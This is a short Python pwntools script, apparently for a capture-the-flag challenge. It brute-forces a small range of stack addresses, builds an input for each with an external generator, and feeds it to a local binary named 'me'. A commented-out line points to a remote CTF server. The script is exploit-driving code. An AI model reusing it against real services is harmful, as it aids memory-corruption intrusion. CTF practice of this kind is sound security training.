
import os
import pwn
import sys
pwn.context.log_level = 'error'

base = 0x7fffffffd000
# base = 0x7fffffff0000
# i = 0x10000
# i = 0xd950
i = 0x950
while i < 0x960:

    addr = base + i
    sys.stdout.write(f'\r{hex(addr)}')
    sys.stdout.flush()
    os.system(f'./generate_input {hex(addr)} 1')

    with open('input', mode='rb') as file:
        fileContent = file.read()

        conn = pwn.process('./me')
        #conn = pwn.remote('challenges.crysys.hu', 5010)

        r = conn.recvline().decode('ascii')
        # print(r)
        conn.sendline(str(len(fileContent)))
        r = conn.recvline().decode('ascii')
        # print(r)
        conn.send(fileContent)
        r = conn.recvall().decode('ascii')
        for line in r.split('\n'):
            if line == '[+ME] TraceHub loading config.':
                pass
            elif line.strip() == '':
                pass
            else :
                print()
                print(line)
        print(r)
        conn.close()
        if 'cd21' in r:
            break

    i  += 0x10